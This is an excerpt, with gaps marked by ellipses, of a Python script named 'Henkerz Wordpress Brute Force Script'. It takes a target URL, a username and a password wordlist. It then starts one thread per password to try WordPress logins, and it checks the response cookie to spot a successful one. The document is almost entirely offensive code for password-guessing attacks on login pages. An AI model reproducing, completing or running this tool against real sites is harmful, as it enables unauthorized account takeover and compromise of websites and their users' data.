...
banner = """
            Henkerz Wordpress Brute Force Script
...
def urlCMS(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https://')
        os._exit(1)
    # Page login
...
def responseCMS(response):
    if response.get('set-cookie', '').split(" ")[-1] == "httponly":
        return "1"

def connection(url, url2, user, password, UA, timeout):
    username = user
    pwd = password
...
commandList.add_option('-t', '--target',
                       action="store",
                       help="Insert URL: http[s]://www.example.com",
                       )
...
commandList.add_option('-w', '--wordlistfile',
                       action="store",
...
# Check args
if not options.target or not options.username or not options.wordlistfile:
    print(banner)
    print
...
with open(password, "r", encoding="latin-1") as file:
...
for pwd in wordlist:
    count += 1
    t = Thread(target=connection, args=(url, url2, user, pwd, UA, timeout))
    t.start()
    threads.append(t)
    sys.stdout.write('\r')
